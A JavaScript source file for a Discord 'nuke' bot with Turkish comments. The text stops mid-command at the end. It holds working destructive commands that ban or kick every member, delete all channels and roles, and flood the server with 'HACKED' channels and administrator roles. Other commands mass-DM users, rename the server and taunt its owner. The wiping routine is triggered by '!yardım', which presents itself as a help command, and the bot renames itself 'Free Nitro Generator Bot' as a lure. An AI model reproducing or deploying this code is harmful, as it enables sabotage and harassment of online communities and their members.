const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);
client.on('ready', () => {
 client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB |!yardım| `)
 console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D`);
});



client.on("message", msg => {          
  if (msg.content === "!ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "!kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "!duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", async msg => {
  if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

     msg.guild.channels.cache.forEach(c => {
            c.delete()
        })

    await msg.guild.createChannel("hacked", {
      type: "text"
    });
      await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", { ///hacked
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {  ///hacked
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///hacked
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", { ///hacked
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {  ///hacked
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");  ///hacked
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {  ///hacked
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })   ///hacked
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {  ///hacked
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })   ///hacked
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild  ///hacked
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"     ///hacked
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED xD", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })  ///hacked
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("HACKED", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });                      ///hacked
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
 
 

 



    await msg.guild.setIcon("https://hizliresim.com/zUSK3E");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://hizliresim.com/jNCN1l"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("Free Nitro Generator Bot");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**Sunucunu Hackledim Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   ///null
});



    client.on("message", msg => {
  if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"]    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "E000FF",  ///null
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});


client.on('message', msg => {
  if (msg.content === '!spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
         
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
    msg.channel.send('bu banbotun gerçek sahibi melik ama yıkık olandan alayım#0061 budur ve sunucusu vardır:https://discord.gg/dCbWgZtRFB ');
